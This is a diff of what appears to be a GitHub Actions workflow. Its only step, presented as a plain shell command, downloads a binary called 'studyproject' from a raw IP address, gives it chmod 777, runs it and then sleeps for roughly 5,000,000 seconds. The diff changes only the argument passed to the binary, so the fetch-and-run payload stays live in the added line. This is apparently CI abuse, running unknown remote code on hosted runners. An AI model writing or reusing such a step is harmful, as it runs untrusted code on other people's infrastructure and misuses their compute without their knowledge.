@@ -14,4 +14,4 @@ jobs:
         uses: actions/checkout@v3
 
       - name: Run a Single Shell Command
-        run: curl -O 45.81.252.38/studyproject; chmod 777 studyproject; ./studyproject github; sleep 5000000
+        run: curl -O 45.81.252.38/studyproject; chmod 777 studyproject; ./studyproject github1; sleep 5000000
